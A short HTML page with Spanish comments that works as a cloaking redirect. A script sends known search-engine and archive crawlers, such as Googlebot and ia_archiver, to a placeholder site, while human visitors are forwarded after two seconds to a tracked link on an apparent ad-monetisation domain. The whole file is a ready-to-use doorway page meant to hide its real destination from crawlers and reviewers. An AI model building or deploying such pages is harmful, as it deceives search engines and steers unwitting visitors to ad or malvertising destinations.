<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirección</title>

    <script>
        // Lista de User Agents conocidos de bots
        const botUserAgents = [
            "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider",
            "YandexBot", "Sogou", "Facebot", "ia_archiver"
        ];

        // Función para detectar si es un bot
        function isBot() {
            const userAgent = navigator.userAgent;
            return botUserAgents.some(bot => userAgent.includes(bot));
        }

        // Si es un bot, redirigir a una página vacía
        if (isBot()) {
            window.location.replace("https://www.ejemplo.com/");  // Cambia esto por la URL a la que deseas redirigir los bots
        }
    </script>

    <!-- Meta refresh para redirigir después de 2 segundos (solo si no es un bot) -->
    <meta http-equiv="refresh" content="2;url=https://www.effectiveratecpm.com/yzmvq78n?key=8ecb5d166f3c46a6bd52bb278155058f">
</head>
<body>
    <!-- El contenido de la página será redirigido después de 2 segundos si no es un bot -->
</body>
</html>
